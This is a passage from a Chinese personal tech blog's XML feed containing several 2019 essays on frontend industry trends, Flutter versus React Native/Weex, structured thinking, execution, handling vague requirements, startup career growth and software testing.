No</h4><p>有的人敢跟需求方怼，但是在主管面前却毫无勇气，原因是主管会给你打绩效，他会影响你未来一年的涨薪、晋升等，所以对主管会言听计从。这显然是不对的。你是团队的一份子，你今年拿不到结果，也就意味着今年团队有一部分的结果堪忧，所以你在团队里无时无刻都扮演着重要的角色。</p><p>遇到不合理的需求，即使是主管指派的任务，你也要勇敢地站出来，告诉他，你错了，指出主管的错误，是为了自己好，更是为了团队好，你指出的问题越多，团队走偏的可能性就越低，你一定要明白这个道理。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 执行者 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端领域的市场需求</title>
      <link href="/blog/2019/07/16/why-fe-improved/"/>
      <url>/blog/2019/07/16/why-fe-improved/</url>
      
        <content type="html"><![CDATA[<p>最近一段时间是阿里的晋升季，前端方向与往年不一样的是，高 P 涌现的趋势越来越明显，这说明前端这个领域已经进入了新的高度。</p><p>其实回首想一想也能感受到，曾经的前端还被定义为 JS 工程师&#x2F;重构工程师，现如今市面上的 JD 几乎已经看不到这两个词的影子了。</p><p><img src="/../blogimgs/2019/07/16/why_fe_improved.png" alt="残酷的未来"></p><p>仔细想一想，核心的原因是什么？是哪些因素把资源角色的前端推到了主导业务的角色。我觉得有这么几点：</p><ol><li><p>Node.js 的出现，让前端具备了 Server 端的能力，虽然拥有的能力并不多，但是全栈这个概念让很多资深工程师趋之若鹜，甚至引来了一些其他领域的工程师，前端队伍突然壮大，各种思想碰撞后，前端自然也就拓展了边界。</p></li><li><p>多端技术的融合，为了节约生产资源，提高生产力，很多大厂都投入了大量的人才进入跨端生产的技术研究之中，前端在 Native 上又多了一次学习的机会，甚至一度有着统一三端的雄心。不过目前还尚未能看到终局，Flutter 也不一定是未来。</p></li><li><p>基础能力和基础工具收敛以后，前端之间工作内容的相似性越来越突出，这吸引了很多整合能力较强资深工程师，为了提升可复用性和使用效率，横向挖掘了大量有价值的解决方案。从解决小问题变成解决大问题，问题的量级不一样，自然对能力的要求也不一样。</p></li><li><p>商业的进化也铸就了前端，这一层的理解可能有点绕，但是我觉得也算是重要原因之一：前端是与用户最贴近的一个技术工种，无论是用户对体验的诉求，还是企业对服务质量的要求，都促使着前端不断地突破自我，寻找新的思路来迎合来自企业和用户的双重挑战。</p></li></ol><p>尽管近两年前端发声稍微小了一些，但是这并不意味着前端这个行业会衰弱下去，市场对前端工程师的需求量还会随着 5G&#x2F;IoT&#x2F;VR&#x2F;AR 等技术的革新继续增长，只不过对人的要求可能会有一些变化。</p><p>首先是学习能力，学习能力不仅仅是你看懂某个技术知识点的能力，更需要有人能够将技术整合到商业之中，这也是需要强大的学习能力的，没有良好的基础和各种方案的长期实践，很难做好这件事情。这里可能更加强调学习并创新的能力，学，以致用。</p><p>其次是突破的能力，未来的前端一定是越来越难做，因为好做的事情，能快速出成绩的事情会越来越少，我们遇到的大概都是些硬骨头，啃碎了才能吸到骨髓，不想啃，就没有你的机会，啃不动牙碎了，你就直接被淘汰了。</p><p>有人在唱，研发人员在整个市场已经趋于饱和了，未来还会有更多的裁员和更加残酷的竞争，我也认可这个观点，未来会更残酷，我们要做的不应该是自怨自艾和畏畏缩缩，如果你还想跟着这个时代一齐向前，就必须振奋起来，披荆斩棘！</p><hr><p><strong>题图</strong>: <a href="https://unsplash.com/photos/Up_qnNWO7IY">https://unsplash.com/photos/Up_qnNWO7IY</a></p><p><strong>2019-07-16</strong>：打个小广告，淘宝前端工程团队还在招人，2020 年毕业的校招生，以及 P7 的社招（有极少量 P6+ 的坑位），都要，需求量还挺大，有意者可以邮件联系我，<a href="mailto:&#98;&#x61;&#114;&#x72;&#x65;&#116;&#x2e;&#99;&#104;&#x69;&#110;&#97;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#98;&#x61;&#114;&#x72;&#x65;&#116;&#x2e;&#99;&#104;&#x69;&#110;&#97;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#x6d;</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端杂烩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊一下，为什么前端会发展这么“快”，再聊一下为什么前端会发展这么“慢”</title>
      <link href="/blog/2019/06/27/the-root-reason-for-the-developing-of-fe/"/>
      <url>/blog/2019/06/27/the-root-reason-for-the-developing-of-fe/</url>
      
        <content type="html"><![CDATA[<p>聊一下，为什么前端会发展这么“快”，再聊一下为什么前端会发展这么“慢”。</p><p>前端这个概念出现的时间不算很早，但差不多也有 10 多年了，也不短了。前几年大家都在喊变化太快，学习的步伐跟不上社区的发展，为什么会出现这样的声音？前端到底以一种什么样的速度在演进？下面，我们跳跃到逻辑的最底层，一起来探讨分析下。</p><p><strong>1、硬件环境在进化</strong></p><p>根据摩尔定律，当价格不变时，集成电路上可容纳的元器件的数目，约每隔 18<del>24 个月便会增加一倍，性能也将提升一倍。想想十年前你用的什么手机？Nokia、Motorola 都算是潮流机吧，经过 5</del>7 个摩尔周期以后，现在呢？随便一个三百块钱的机器屏幕分辨率、内存和 CPU 能力都可以秒杀当年的初级智能机。硬件环境的变化让整个互联网的基建设施变得更加流畅，甚至慢慢地，我们已经感受不到网速给上网带来的影响了，尤其是 5G 时代的即将来临，我们几乎不需要手机上具备大储存能力，所有的数据放在云端，瞬间就能下载到本地，即便是看 8K 视频都能达到无缓冲效果。</p><p>硬件的发展，让信息从真实世界传输到网络世界的效率变得更高，从文字到图片，到音视频，到直播，再到 VR&#x2F;AR，每一种新的富媒体出现，都会给前端带来各种不同的挑战，每次给人的感觉都是一次全新升级。我相信这种变化还会持续下去，未来的网络世界一定会在真实世界产生更多的虚拟现实，并深刻影响人们的生活。</p><p><strong>2、互联网在进化</strong></p><p>从 Web 1.0 到 Web 2.0，互联网从一个信息源渠道的角色变成了人和人之间串联的纽带，人们的非物质需求变得更加旺盛。整个互联网也从一个中心式发展结构演变成了多中心甚至分布式结构，每个人都成了自媒体。人与人之间的交往已经脱离了时间和空间的限制，你在网络上喊一句话，可能会有来自五湖四海的人的回应，你白天喊一句话，可能晚上还能有人在回复，甚至一个月后还有人在与你交流。人们的社交域已经从方圆 100 公里突破到了整个星球，对信息的流动速度和质量也有了更高的要求。随着 Web 3.0 的出现，整个网络变得更加智能，信息本身就具备了识别、过滤、筛选、匹配等能力，人和人之间的关系模型也变得越来越复杂。</p><p>互联网的发展，让信息的形态和结构变得尤其丰富，让人们对信息的多元化呈现和信息触达的及时性需求变得更加强烈，这一切将前端技术不断推向新的高潮，出现了很多适应时代变化的技术，如 Ajax&#x2F;Websocket&#x2F;WebRTC&#x2F;PWA-push，再如 Animation&#x2F;SVG&#x2F;Canvas&#x2F;WebGL 等等。</p><p><strong>3、商业环境在进化</strong></p><p>在人和网络之间不断地会出现新的跨时代容器，从各类门户网站到各类通讯软件，然后慢慢渗透到人们生活的方方面面，配合大数据和数据智能，又衍生出更多影响甚至改变人们生活方式的互联网产品，这一切都是因为商业在后方不断输送新的能量。在这个信息时代，能被数字化的内容都将纳入商业的范畴，数字化带来更多的商业价值，而更大的商业价值也会驱动更强的数字化革命，我们就身处在这个时代。</p><p>商业环境的变化，让互联网不断地与人打交道，这也导致了商业产品会更加贴近人，考虑人的问题，服务人的生活，影响人的观念，这些都会让前端变得更加复杂，也会让前端为了应对这一切不断地革新自己。通过技术的组装让呈现和交互的成本变得更低，因此有了各类框架的迭代和升级；通过更强的规则和约束让不同形态和不同域的产品具备更多的相似性，因此有了各类技术规范和标准的发展；通过更广域和更底层的技术平台来保证上层技术更好地为业务服务，因此出现了安全、工程、多端、跨栈等技术的崛起。</p><p>硬件是基础，商业在推动，需求来自人，改变在网络。</p><p>这十年，前端的活跃度在整个互联网技术圈都有目共睹，前端的核心语言 JavaScript 也从一个脚本小子晋升到鼎鼎有名的豪门大家，看起来前端这个行业在飞快地成长着，但是细细品味，其实会发现，前端跑得很慢，像一只乌龟一样。</p><ul><li>第一个阶段是因为浏览器的发展，那是 PC 之战，在这个过程中，前端沉淀下来的东西似乎并不多，只是这个岗位被炒热了；</li><li>第二个阶段是无线时代的到来，为了提高生产力，前端几乎钻进了所有邻居的床上，有着一统用户端的霸气，而沉淀的内容却只是一堆即将或已经淹没在历史红尘的技术垫脚石；</li><li>当前阶段更多的是从体验、效率层面着手，将其他领域优秀的思考搬迁到前端领域，思考的边界也很多，我觉得还在探索之中；</li></ul><p>前端给人的感觉始终还是散乱的，不成体系的。后来，大家开始淡化前端这个词汇，出现了多端、大前端、云+端的概念，这也说明前端具备了更强的包容度。</p><p>不可否认，前端的发展给业务带来了巨大的价值，但是从厚度和深度上来看，还有很长的路要走。但，可能，也没准，前端还是会一直这么浪地发展下去；）</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解 Flutter 和 RN/Weex 的差异</title>
      <link href="/blog/2019/06/21/the-difference-between-flutter-and-weex/"/>
      <url>/blog/2019/06/21/the-difference-between-flutter-and-weex/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blogimgs/2019/06/21/flutter.png" alt="upload successful"></p><p>Flutter 和 RN&#x2F;Weex 的差异，核心在于渲染的基础由自己实现，简单来说，</p><ul><li>Flutter 的代码经过 Flutter 引擎直接就渲染到了屏幕上</li><li>而 RN&#x2F;Weex 的代码需要先跑到 Native 层处理一下，然后经过 Native 层渲染到屏幕</li></ul><p>很显然前者效率会更高。由于 Native 组件可能会随着系统的升级跟着一起升级（API 增、删或变化），RN&#x2F;Weex 需要写很多胶水层代码来适配不同版本、不同平台的 Native 组件，而 Flutter 就不存在这个问题，但 Flutter 却不能像 RN&#x2F;Weex 那般可以直接使用 Native 提供的丰富组件和属性，它需要使用 Flutter 引擎暴露出来的底层 API 做封装，</p><ul><li>比如要具备 Flex 布局能力，就需要写一个 Flex 引擎来识别上层的 Flex 语法</li><li>比如想使用 React 的 DSL，上层就必须实现一个类 React 框架来对接 Flutter 引擎提供的渲染 API</li><li>再比如想使用圆角、投影等等，就必须增加一种渲染策略来实现圆角效果和阴影效果等等</li></ul><p>好在 Flutter 社区针对 Android 和 iOS 分别实现了一套适合各自系统风格的组件，长得跟 Native 一样。如果这些组件不能满足开发者的需求，开发者也可以很轻松地定义一种新的组件，这对开发者显然是十分友好的，我们可以拿到非常底层的 API 做各种想实现的效果，而且性能还特别高。</p><p>Flutter 引擎之上有一层是 Dart，事实上它就提供了上面我们所说的 Flex 布局能力、类 React 的 DSL 能力、各种动画、CSS rule 等，其实现方式就利用 Flutter 引擎提供的比较底层的可以直接在 GPU 上渲染的 API 能力。</p><p>如果你想用 Vue 的 DSL 写 Flutter 行不行？其实也是可以的，但是需要有人写一个 Vue 的框架来对接 Flutter 引擎提供的渲染 API，Flutter 引擎就像一个 Driver 层，保证了在各端上的渲染一致性，需要开发者在 Driver 之上进行自己的框架抽象、组件抽象等。</p><p>以上，可能表述存在一些偏差，但是基本就是这么个意思。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> weex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升结构化思考力</title>
      <link href="/blog/2019/06/18/thinking-framework/"/>
      <url>/blog/2019/06/18/thinking-framework/</url>
      
        <content type="html"><![CDATA[<h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><p>很多人在遇到复杂需求或者陌生领域问题的时候，脑子里便是一团浆糊，东一锥子西一锥子，把事情越搞越乱，最后拿不到结果，究其原因，是缺乏结构性、系统性的思考。</p><p>通常有两种路径来提升结构化思考力：</p><ol><li>在明确核心问题的情况下，建立中心，通过对核心要素进行分解，形成旁支结构，然后对旁支就行合并、修剪、删除等操作，收敛最终的高权重旁支，然后进一步寻找对策、制定方案；</li><li>在不明确核心问题的情况下，从人、事和势等几个维度进行问题发散，获取全面多视角的问题集，然后进行多层的分类、剪枝和归并操作，汇总成一个中心，然后执行步骤 1。</li></ol><p>在归纳旁支的时候，有两个重要的原则是：完整性和正交性，即确保问题不重叠、不遗漏且相互独立。有几种不错的分解问题的思路：</p><ul><li>从时间顺序思考，比如安排一次技术大会，思考每个环节会遇到什么问题</li><li>从结构顺序思考，比如跨团队的业务合作，思考团队对内和对外的职责，对上和对下的策略，业务的边界等</li><li>从程度顺序思考，比如提升网站的回访率，思考产品结构、运营策略、用户体验、品牌推广等等的重要度，厘清主次</li></ul><p>在分解和收敛问题的过程中，需要注意的是：</p><ol><li>泛化抽象，同类、同区间问题合并，不断明确泛化边界点</li><li>查漏补缺，通过对比、派生等方式，分析缺失部分，可以参考 SWOT 分析法，从优势、劣势、机会、威胁这四个方面考虑问题</li><li>删除枝叶，抓大放小，分清阶段性需要解决的问题</li></ol><p>结构化和系统化的思考力是可以培养的，平时遇到问题建议多强化训练，比如可以动手针对职业发展、业务需求、年度规划等问题在 XMind 上画一画。</p><hr><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><p>在做计划的时候，少不了枚举问题或者事情，往往很多人枚举域局限于脑子的热度，兴奋的时候能冒出一堆 TodoList，没感觉的时候就跟挤牙膏一样，什么事情都想不出来，比如现在让你思考下「提高自己」这件事情，是不是蹦出来的都是多读书、多交流、多思考，然后就要挤牙膏了。</p><p>思考的时候，如果有一个 Thinking Framework 可以参照的话，可能会轻松很多。在上面的讨论中我提到过一个 SWOT（Strength-Weakness-Opportunity-Threat）分析法，这是一种思维工具，相关的文章在 Google 上能检索到一大堆，下面主要是尝试分析下，这种工具为什么可以帮助我们更好地思考问题。</p><p>当我们把一个问题分解成更细的问题或者任务的时候，如何保证不漏项？如何保证拆分出来的内容不存在交集？这是我们首先需要思考的问题。</p><ul><li>不漏项，是确保拆解的完整性</li><li>不重复，是确保拆解的正交性</li></ul><p>我们挤牙膏的动作就是为了保证自己分析的完整性，但是挤牙膏这种脑暴式的问题分解方式往往得不到完整的问题集，怎么办呢？上次我讲过可以从时间、程度、结构等方式进行分析，因为这几个因素都是连续的，连续就一定不会遗漏；还有一种暴力的方式，N 和非 N，逻辑上正反相对面一定可以囊括所有情况，然后提取新的变量 M，在 N 的基础上分出 NM 和 N 非 M，依此类推。</p><p>SWOT 分析法就是从两个对立分解因子上帮助我们剖析问题的，一个因子是内外边界，SW 是内部环境，OT 是外部环境；另一个因子是好坏边界，SO 是优势面，WT 是劣势面。通过这两个因子可以比较好的把工作所处的优势、劣势、机会和威胁分析得很清楚，同时让你明确机会的优劣是什么，威胁的优劣是什么。</p><p>上面我说的不漏项不重复，其实是一种分析法，叫 MECE（Mutually Exclusive Collectively Exhaustive），意思就是“相互独立，完全穷尽”，也可以去 Google 学习下。任何一种结构化思考力都需要通过长期的刻意培养才能形成习惯，多锻炼，一个好的途径是，多画图，多写 PPT。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 结构化 </tag>
            
            <tag> 思考力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何成为一名优秀的业务人员/工程师？</title>
      <link href="/blog/2019/06/15/to-be-excellent-in-work/"/>
      <url>/blog/2019/06/15/to-be-excellent-in-work/</url>
      
        <content type="html"><![CDATA[<p>如何成为一名优秀的业务人员&#x2F;工程师，我觉得需要反复把下面四件事情做好：</p><p><strong>1、确定一个有挑战的目标</strong></p><p>且不说选一个具备挑战性的目标，很多人根本就没有明确的目标，浑浑噩噩的，也不知道自己究竟想要什么，自然也不会过多地去思考自己有什么优势，有什么劣势，能做成什么事情，更不会去想，如何创造新的价值，找到新的效益。明确的目标让我们的行动更加聚焦，而有挑战的目标会让我们从心底就涌出一股向上的动力，不仅可以找到新的价值点，也可以帮助我们更好地提升自己。</p><p>0 代表几乎不用力就可以达到的目标，10 代表几乎不可能完成的目标，如果从 0 到 10 给自己的目标打分，你的目标应该在 7 分左右。</p><p><strong>2、全面、透彻地分解问题（简单的问题复杂化）</strong></p><p>目标定好了以后，马上行动是不可能的，因为挑战性的目标并不会那么容易达成，就算方向是明确的，如果没有做好周全的计划，行动也是难以持久的。首先我们需要从各个方面对目标进行详细分解，这个过程是为了让简单的事情变得复杂，是为了控制好未来可能会遇到的各种风险，找到行动预案。</p><p>根据目标分解出 2~3 件具备可评估因子的事情，同时提前思考，如果半年后我没有达成目标，或者彻底失败了，可能的原因是什么。</p><p><strong>3、有条理、有节奏地践行（复杂的问题做简单）</strong></p><p>如果想的很复杂，做起来也特别复杂，那一定是想的有问题，或者执行上存在问题。让行动变得简单，可以让我们的精力聚焦在几件核心的事情上，把核心事情做好，同时也可以帮助我们一定程度控制成本。简单可以让人记住，简单可以聚焦，简单可以让内心保持宁静。</p><p>行动过程中，不断对焦目标，不断反思。所谓反思，先有思，再有反思。反思就是拿当前的事情与最初定下的事情作对比，反思不仅仅是事情结束以后再去思考，在行动前、行动中和行动后，都应该反思。</p><p><strong>4、分享失败和成功的经验</strong></p><p>如何看自己是否真的理解了一件事情？我觉得你能够把它明明白白地讲给外行人听，那就是理解了。我觉得理解有三个层次，知识、行动和态度，知识是肤浅的，知识是死的，而深入的理解知识可以指导行动，完整地理解会影响一个人的态度。</p><p>一个团队需要传承，一家企业更需要传承，知识需要被分享，经验和教训同样也需要。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变得优秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何杜绝一句话需求？</title>
      <link href="/blog/2019/06/14/principles-before-req/"/>
      <url>/blog/2019/06/14/principles-before-req/</url>
      
        <content type="html"><![CDATA[<p>如何杜绝一句话需求？首先我们来看看什么是一句话需求：</p><ul><li>“把这个视觉稿还原下，明天交付给产品”</li><li>“这个开放接口再增加一个额外的开放功能，给外包场景使用”</li><li>“给我跑一个数据报表，分析下近期的用户行为”</li><li>“把这个 Icon 调大一点”</li></ul><p>我们经常会提到用户故事这个词，从用户故事中会抽离出一些业务上和技术上的需求，然后针对需求做细分产生一系列任务。很多一句话需求就像是一个任务，没有背景，没有分析，没有评审，直接扔过来交给你，此时你的角色只是一个简单的执行者。</p><p>那如何杜绝呢？有两个策略，最常见的是，给需求加要求：</p><ul><li>没有详细背景的需求不接</li><li>看不到业务价值的需求不接</li><li>没有数据预期的需求不接</li><li>频繁更改的需求不接</li></ul><p>这种策略是一种守的姿态来应对“外部刺激”，很被动，倘若拒绝得过于粗暴还不利于与合作方的长期共存。给偏爱使用这种策略的同学几点建议：</p><ul><li>首先，不能说不（Never say no）</li><li>你应该说“好，我接受，但是……”，注意这里的但是</li><li>“我不保证质量&#x2F;我不保证时间&#x2F;我既不保证质量也不保证时间”</li><li>“除非，你砍点需求&#x2F;延长点时间”</li><li>此时，再和谐地抛出你的要求：能不能先想清楚业务价值，能不能给一个确定不改的需求，能不能给出数据预期等等</li></ul><p>通过这种委婉且合理又不伤感情的方式，倒逼需求方按照你的要求做事情，这是一种“守”的策略。另一种策略是“攻”，主动出击，梳理自己的问题和需求方的目标，深入敌方：</p><ul><li>目前我的系统存在哪些问题，安全、性能、稳定性、可拓展性等，确定最致命问题</li><li>需求方的长期目标是什么，阶段性目标是什么，近期目标是什么</li><li>从长期来看，我的系统需要沉淀什么能力来应对需求方</li><li>需求方提过来的需求要实现他哪个阶段目标，他提的需求是否真的可以实现他的目标，他是如何分析的，我结合他的分析能否得出同样的结论</li><li>为什么他总是会提出一句话需求，他的需求源是从哪里来的，他的老板？他的客户？他的合作伙伴？</li><li>能不能让他的需求源在给他传递消息的同时也传递给我，至少让我知道他消化需求的姿势是正确的，对需求源的理解没有偏差</li></ul><p>兵家有云，知己知彼方能百战百胜，把己方的问题和需求方的问题都分析的妥妥的，然后按计划办事，经过一段时间的自我消化和自我调整，自然可以很好的扼制住如洪水般的需求。换一种说法就是，你要学会帮助需求方更好地分析问题，这个要求很高，需要你对业务有足够的理解和判断。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 需求 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何有效地提升执行力</title>
      <link href="/blog/2019/06/11/improving-execution/"/>
      <url>/blog/2019/06/11/improving-execution/</url>
      
        <content type="html"><![CDATA[<p>有同学在交流圈子里感叹，“感悟和计划比较容易有，执行力就…呵呵了”，如何提升执行力，下面我来聊一聊，给个思路。</p><p><img src="/../blogimgs/2019/06/11/improving-excution.png" alt="upload successful"></p><p>执行力是什么？百科上这么说的，<strong>所谓执行力，指的是贯彻战略意图，完成预定目标的实际操作能力</strong>。我们拆分下：</p><ul><li>首先我们需要有一个<strong>明确的目标</strong>，知道我们实际行动是做什么事情（Plan）</li><li>执行力是一种能力，是一种操作能力，也就是说需要我们付出<strong>实际行动</strong>（Do）</li><li>然后我们要理解目标，防止在实际操作的过程中误入歧途（Check）</li><li>如果误入歧途怎么办？<strong>及时作出调整</strong>，或者修正初始目标（Adjust）</li></ul><p>简单来说，<strong>执行力就是做事的能力</strong>，上面的拆分其实就是 PDCA 工作法的展示，这是一个循环的过程，调整目标之后，进入下一个 Adjust-Plan-Do-Check 的过程。那为什么你的执行力不强呢？其实道理也很简单，从上四个步骤中找原因：</p><ul><li>计划 Plan<ul><li>目标含糊，不知道自己要做什么</li><li>没有工具和手段来衡量目标</li><li>目标太大，几乎无法达到</li><li>目标太多，没有重点，目标之间没有关联</li><li>没有设定期限，无时限地行动下去</li></ul></li><li>执行 Do<ul><li>能力不足，无法达到</li><li>条件受限，无法达到</li></ul></li><li>检查 Check<ul><li>检查不及时，偏离轨道太久，可能已经没有继续的欲望了</li><li>检查项与考核内容不一致</li><li>越查事情越多，做着做着，脱离了目标</li></ul></li><li>调整 Adjust<ul><li>没有这个步骤</li></ul></li></ul><p>Plan 步骤中提到的 5 点其实就是 S.M.A.R.T 原则的基本要求，这 5 点都是反例。如果你定好了一个恰当的目标，在行动过程中不断地对焦，那么事情就不会过于脱轨。如何判断目标是否恰当呢，我的经验是：<strong>「有趣且有挑战」</strong>，比如：</p><ul><li>我要减肥并不是很好的目标，我想在沙滩上秀腹肌给一群妹纸看就好多了，你可以在每次健身和节食的时候都想象下那个画面</li><li>我要提升英语并不是很好的目标，我想一个人去国外旅游，欣赏国外的美景，尝遍国外的美食，这个画面就比较有意思了</li><li>我今年要看完二十本书并不是一个很好的目标，我想提升自己的结构化思考力，在跟人聊天、演讲、汇报的时候更顺利，这就有点动力了</li></ul><p>所以说，很多时候并不是你执行力不够，而是你的目标定的没有吸引力，或者目标定的太大或太小，如果你的目标刚刚好，你仍然不能坚持下去，那只有两个原因：</p><ul><li>你这个人啊，太没有<strong>毅力</strong>了</li><li>你这个目标达不达成，可能对你来说，<strong>无所谓</strong>（还是目标的吸引力不够）</li></ul><p>以上，希望对你有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 执行力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新人在中小公司遇到的成长困境</title>
      <link href="/blog/2019/06/09/growth-in-startup/"/>
      <url>/blog/2019/06/09/growth-in-startup/</url>
      
        <content type="html"><![CDATA[<p>有个童鞋在一家创业公司工作，近期遇到了些 <a href="https://t.zsxq.com/Z7yniQv">疑问</a>：“如何才算是高级前端开发工程师，以及在创业公司比较繁忙的情况下，如何更好的成长？”，对此他自己做了总结，以下几类事情占据了他主要的时间：</p><ol><li>公司最近为了融资需要快速更迭产品，所以需要大家在短时间内上线产品</li><li>工作不到一年，写代码熟练度还不够，所以开发速度不够快</li><li>为了产品更快上线，需要改同事写的 bug</li></ol><p>“所以导致工作以来属于自己的个人学习时间变少”，他说。</p><p><img src="/../blogimgs/2019/06/09/006tKfTcgy1fezyf4npsuj30p00dw40s.jpg" alt="image"></p><p>我想，很多职业新人都会遇到类似的问题，针对上面三个问题，我们来一一分析下，找到更加深层的问题：</p><ol><li>公司发展阶段，产品周期较短，需求不断</li><li>自己技能不足，难以满足公司短平快的开发要求</li><li>迭代的过程中，还需要维护历史遗留问题</li></ol><p>上面几点，是对他的问题做了归纳，但是大家应该看得出来，还不够凝练，没有找到核心问题，我们继续分析下：</p><ul><li>1 和 3 属于同类问题，公司在追求市场份额过程中，在各个方向发力，产品分支比较多，很多可能还是实验性的产品，在没有拿到结果之前，需要技术持续投入；</li><li>第 2 点属于个人问题，这个问题与上面的公司问题形成恶性循环，个人能力不够、业务繁忙导致时间不够，时间不够导致业务问题和技术债堆积，业务问题和技术债堆积导致时间更加不够，然后就递归恶化下去了。</li></ul><p>通过上面的分析，我们抽象出了两个因素，一个是个人因素，一个是公司因素，两个因素的连接点是时间不够用，如何解？</p><p><strong>① 如果你解决问题的速度跟不上问题出现的速度，那么堆积的问题就会越来越多，</strong>对应的策略是：</p><ul><li>提升自己解决问题的速度（个人因素问题），也就是不断补充知识量和提升编程能力，适当提升架构水平；</li><li>抑制问题产生的速度（公司因素问题）就比较困难了，你可以系统地学习下项目管理的知识；另外，与需求方搞好个人关系也会有一定的帮助 ；）</li></ul><p><strong>② 时间是不变的，但是单位时间内工作的价值是可以延长的，朴素点说，你应该让这个月写的代码在未来一个月甚至半年中都能产生价值</strong>，对应的策略是：</p><ul><li>有意识地提升自己的抽象能力，挖掘可复用的内容；在工作过程中，不断沉淀可复用的脚本、组件、模块等；</li><li>将自己能力的提升计划，适当强插到公司因素问题的解决过程中，比如你想了解某个框架的使用，做项目的时候就用这个框架好了，不要因为你不懂这个框架而担心项目做不完，毕竟成长本身就是需要付出点时间成本的。</li></ul><p>当你把这两块做好了以后，当你能够驾驭当前的工作之时，你就是高级工程师了。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊测试</title>
      <link href="/blog/2019/05/30/microservice-design-about-testing/"/>
      <url>/blog/2019/05/30/microservice-design-about-testing/</url>
      
        <content type="html"><![CDATA[<p>看《微服务设计》一书的测试章节，有一些想法，记录下。</p><h3 id="测试分类象限图"><a href="#测试分类象限图" class="headerlink" title="测试分类象限图"></a>测试分类象限图</h3><p>为保证业务的质量和稳定性，一般会进行诸多测试，测试有很多类型，大致可以归类为：</p><ul><li>验证是否实现了功能（验收测试）</li><li>验证是否正确实现了功能（单元测试）</li><li>对产品可用性做测试，如响应时间、性能、安全等（非功能性测试）</li></ul><p><img src="/../blogimgs/2019/05/30/%E6%B5%8B%E8%AF%95%E8%B1%A1%E9%99%90%E5%88%86%E7%B1%BB%E5%9B%BE.png" alt="upload successful"></p><p>我们平时会写两类代码，一种是基础类代码，一种是业务类代码，前者更多的是面向团队，后者更多的是面向产品。</p><p>面向产品的代码主要是业务逻辑，大多数情况会在验收环节进行验证，这一环可以通过自动化+人工测试保障，实际情况更多还是人工测试，编写 UI 测试用例的成本是极高的，而且在业务迭代快的情况下，根本来不及写测试用例，还不如人工回归；而面向团队的代码通用性较强，功能模块的隔离性做的也比较好，就需要比较多的单元测试来保障了。</p><p>除了验收测试和单元测试，还有一类是面向产品体验的非功能性测试，如性能、响应时间、安全等，这类测试在 2C 的产品中要求得比较多，一般会通过工具来保障，如页面上线时进行真机测试、渗透测试和压力测试等。</p><p>非功能性测试往往会有一个很麻烦的问题：非功能性问题多样性强、差异化大，测试平台难以良好的满足平台用户的测试诉求。一般而言，测试平台需要平台方与开发者共建，平台提供机制，开发者贡献规则和套件。</p><h3 id="测试的覆盖范围"><a href="#测试的覆盖范围" class="headerlink" title="测试的覆盖范围"></a>测试的覆盖范围</h3><p>从测试的覆盖范围来看，可以将测试分为三类：</p><ul><li>函数块的功能测试，不会启动服务（单元测试）</li><li>绕开用户界面，直接对服务调用测试（服务测试）</li><li>打开用户界面进行测试（端对端测试）</li></ul><p>单元测试覆盖的只是一个小的代码片段；服务测试则可能会依赖一连串的代码，甚至会依赖其他系统的服务；端对端的测试，通过时会让人十分放心，因为这类测试会覆盖大量的系统代码。</p><p>在合作的时候，会发现一个十分有意思的现象，很多开发者不愿意写单元测试，几乎每次发布之前，都是将代码提交到预发布环境，让前置依赖方通过端对端测试或者服务测试来验证服务的准确性和稳定性。这带来的问题是什么呢？</p><ul><li>端对端测试容易忽略细节，一旦测试用例不够全面，系统的安全和稳定性将会有很大的挑战；</li><li>端对端测试周期和反馈周期都特别漫长，一次测试需要经过多层系统或者多次函数调用才能触发问题；</li><li>端上的很多操作会触发很多重复的底层代码测试，影响测试效率；</li><li>由于环境的限制，少部分的端对端测试无法进行等；</li></ul><p>问题还有很多，就不一一列举了。如果你的服务会被多个系统调用，或者会被大量的用户使用，我建议你多写测试用例，不要总是依托于上游调用方给你反馈异常，尤其是作为基础服务的时候。</p>]]></content>
      
      
      <categories>
          
          <category> 后端杂烩 </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游记 · 内蒙古银肯响沙湾</title>
      <link href="/blog/2019/05/29/traveling-in-the-desert/"/>
      <url>/blog/2019/05/29/traveling-in-the-desert/</url>
      
